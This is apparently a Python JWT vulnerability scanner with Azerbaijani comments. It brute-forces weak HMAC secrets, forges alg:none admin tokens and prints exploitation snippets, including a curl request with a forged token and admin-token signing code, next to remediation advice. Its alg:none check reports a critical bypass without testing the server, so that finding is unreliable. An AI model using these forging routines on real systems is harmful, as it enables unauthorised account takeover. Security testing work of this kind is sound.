"""
JWT Security Scanner
- Algorithm confusion (alg:none)
- Weak secret brute force
- Algorithm confusion (RS256 -> HS256)
- Sensitive data in payload
- Expiry validation bypass
"""

import base64
import json
import re
import hmac
import hashlib
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "test", "key", "jwt", "token", "pass", "letmein",
    "changeme", "default", "master", "root", "alpine",
    "secret123", "password123", "jwt_secret", "mysecret",
    "", "null", "undefined", "none",
]


class JWTScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _decode_part(self, part: str) -> dict | None:
        try:
            padding = 4 - len(part) % 4
            padded = part + "=" * padding
            decoded = base64.urlsafe_b64decode(padded)
            return json.loads(decoded)
        except Exception:
            return None

    def _encode_part(self, data: dict) -> str:
        encoded = base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=")
        return encoded.decode()

    def _extract_jwts(self, response_text: str, headers: dict) -> list[str]:
        tokens = []
        # Header-lərdən
        auth = headers.get("authorization", "")
        if auth.startswith("Bearer "):
            tokens.append(auth[7:])

        # Response body-dən
        jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]*'
        found = re.findall(jwt_pattern, response_text)
        tokens.extend(found)

        # Cookie-lərdən
        cookie_header = headers.get("set-cookie", "")
        found_cookies = re.findall(jwt_pattern, cookie_header)
        tokens.extend(found_cookies)

        return list(set(tokens))

    def _test_alg_none(self, token: str) -> str | None:
        """alg:none bypass cəhdi — token yarat"""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        header = self._decode_part(parts[0])
        payload = self._decode_part(parts[1])
        if not header or not payload:
            return None

        # Admin/role escalation
        if "role" in payload:
            payload["role"] = "admin"
        if "admin" in payload:
            payload["admin"] = True
        if "is_admin" in payload:
            payload["is_admin"] = True
        if "sub" in payload:
            pass  # sub-u saxla

        # alg: none ilə yeni token
        for alg_variant in ["none", "None", "NONE", "nOnE"]:
            header["alg"] = alg_variant
            new_header = self._encode_part(header)
            new_payload = self._encode_part(payload)
            forged = f"{new_header}.{new_payload}."
            return forged

        return None

    def _test_weak_secret(self, token: str) -> str | None:
        """Zəif secret ilə signature verify cəhdi"""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        header = self._decode_part(parts[0])
        if not header or header.get("alg") not in ["HS256", "HS384", "HS512"]:
            return None

        alg = header["alg"]
        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_func = hash_map.get(alg, hashlib.sha256)
        message = f"{parts[0]}.{parts[1]}".encode()

        for secret in WEAK_SECRETS:
            sig = hmac.new(
                secret.encode(),
                message,
                hash_func
            ).digest()
            encoded_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            if encoded_sig == parts[2]:
                return secret

        return None

    def _analyze_payload(self, token: str, url: str) -> list[Vulnerability]:
        """Payload məzmununu analiz et"""
        vulns = []
        parts = token.split(".")
        if len(parts) != 3:
            return vulns

        header = self._decode_part(parts[0])
        payload = self._decode_part(parts[1])

        if not header or not payload:
            return vulns

        # Sensitive data yoxla
        sensitive_keys = ["password", "passwd", "secret", "api_key",
                          "ssn", "credit_card", "cvv", "private"]
        found_sensitive = [k for k in payload if k.lower() in sensitive_keys]

        if found_sensitive:
            vulns.append(Vulnerability(
                vuln_type="JWT Security",
                url=url,
                severity=Severity.HIGH,
                cvss_score=7.5,
                title="JWT Payload-da Sensitive Data",
                description=(
                    f"JWT payload-ı sensitive məlumat ehtiva edir: {found_sensitive}. "
                    f"JWT base64 decode edilə bilər — şifrə deyil."
                ),
                evidence=f"Payload açarları: {list(payload.keys())}",
                exploitation=(
                    f"Token-i decode et:\n"
                    f"echo '{parts[1]}' | base64 -d 2>/dev/null | python3 -m json.tool"
                ),
                remediation=(
                    "1. Sensitive datanı JWT-dən çıxar\n"
                    "2. Yalnız user ID kimi minimal məlumat saxla\n"
                    "3. Lazımsa JWE (encrypted JWT) istifadə et"
                ),
                cwe_id="CWE-522",
            ))

        # exp yoxlanması
        if "exp" not in payload:
            vulns.append(Vulnerability(
                vuln_type="JWT Security",
                url=url,
                severity=Severity.MEDIUM,
                cvss_score=5.3,
                title="JWT Expiration Yoxdur (exp claim)",
                description="Token-in müddəti təyin edilməyib. Token ömürlük etibarlı qalır.",
                evidence=f"Payload: {json.dumps(payload)[:200]}",
                exploitation="Oğurlanmış token heç vaxt expire olmur.",
                remediation="JWT-ə 'exp' claim əlavə et. Tövsiyə: max 1 saat.",
                cwe_id="CWE-613",
            ))

        # RS256 → HS256 confusion hint
        if header.get("alg") == "RS256":
            vulns.append(Vulnerability(
                vuln_type="JWT Security",
                url=url,
                severity=Severity.HIGH,
                cvss_score=8.1,
                title="JWT Algorithm Confusion (RS256→HS256) Potensialı",
                description=(
                    "Server RS256 istifadə edir. Əgər server public key-i HS256 "
                    "secret kimi qəbul edirsə, token saxtalaşdırıla bilər."
                ),
                evidence=f"alg: {header.get('alg')}",
                exploitation=(
                    "1. Server-in public key-ini al\n"
                    "2. Header-i HS256-ya dəyiş\n"
                    "3. Public key-i HMAC secret kimi işlədərək imzala:\n"
                    "   python3 -c \"\n"
                    "   import jwt, requests\n"
                    "   pubkey = open('public.pem').read()\n"
                    "   token = jwt.encode({'sub':'admin','admin':True}, pubkey, algorithm='HS256')\n"
                    "   print(token)\""
                ),
                remediation=(
                    "1. Server-də alg whitelist tətbiq et — yalnız RS256 qəbul et\n"
                    "2. Algorithm dəyişikliyini rədd et\n"
                    "3. PyJWT-də algorithms=['RS256'] parametri istifadə et"
                ),
                cwe_id="CWE-327",
                references=["https://portswigger.net/web-security/jwt/algorithm-confusion"],
            ))

        return vulns

    async def scan(self, url: str) -> list[Vulnerability]:
        console.print(f"  [dim]JWT skan: {url[:60]}[/dim]")
        vulns = []

        response = await self.http_client.get(url)
        if not response:
            return vulns

        tokens = self._extract_jwts(response.text, dict(response.headers))
        if not tokens:
            return vulns

        console.print(f"  [dim]  {len(tokens)} JWT tapıldı[/dim]")

        for token in tokens:
            # 1. Payload analizi
            payload_vulns = self._analyze_payload(token, url)
            vulns.extend(payload_vulns)

            # 2. Weak secret
            found_secret = self._test_weak_secret(token)
            if found_secret is not None:
                vulns.append(Vulnerability(
                    vuln_type="JWT Security",
                    url=url,
                    severity=Severity.CRITICAL,
                    cvss_score=9.8,
                    title=f"JWT Zəif Secret Tapıldı: '{found_secret}'",
                    description=(
                        f"JWT HMAC secret-i brute force ilə tapıldı: '{found_secret}'. "
                        f"İstənilən token saxtalaşdırıla bilər."
                    ),
                    evidence=f"Secret: '{found_secret}' ilə signature uyğun gəldi",
                    exploitation=(
                        f"python3 -c \"\n"
                        f"import jwt\n"
                        f"payload = {{'sub': '1', 'admin': True, 'role': 'admin'}}\n"
                        f"token = jwt.encode(payload, '{found_secret}', algorithm='HS256')\n"
                        f"print(token)\""
                    ),
                    remediation=(
                        "1. Dərhal secret-i dəyiş — minimum 256-bit random key\n"
                        "2. Bütün mövcud tokenləri invalidate et\n"
                        "3. python: secrets.token_hex(32) ilə yeni secret yarat\n"
                        "4. RSA/ECDSA (RS256/ES256) istifadəsinə keç"
                    ),
                    payload_used=f"secret='{found_secret}'",
                    cwe_id="CWE-330",
                ))
                console.print(f"  🔴 [bold red]JWT Weak Secret:[/bold red] '{found_secret}'")

            # 3. alg:none
            forged = self._test_alg_none(token)
            if forged:
                vulns.append(Vulnerability(
                    vuln_type="JWT Security",
                    url=url,
                    severity=Severity.CRITICAL,
                    cvss_score=9.1,
                    title="JWT Algorithm None Bypass",
                    description=(
                        "Server 'alg:none' tokenləri qəbul edə bilər. "
                        "Signature olmadan ixtiyari payload göndərmək mümkündür."
                    ),
                    evidence="alg:none ilə forged token yaradıldı",
                    exploitation=(
                        f"Bu token-i Authorization header-ə yaz:\n"
                        f"Authorization: Bearer {forged}\n\n"
                        f"Curl:\ncurl -H 'Authorization: Bearer {forged}' {url}"
                    ),
                    remediation=(
                        "1. JWT library-də 'none' algorithm-i rədd et\n"
                        "2. Algorithm whitelist tətbiq et\n"
                        "3. PyJWT: jwt.decode(token, key, algorithms=['HS256'])"
                    ),
                    payload_used=forged[:100],
                    cwe_id="CWE-347",
                    references=["https://portswigger.net/web-security/jwt"],
                ))
                console.print(f"  🔴 [bold red]JWT alg:none:[/bold red] bypass mümkün")

        return vulns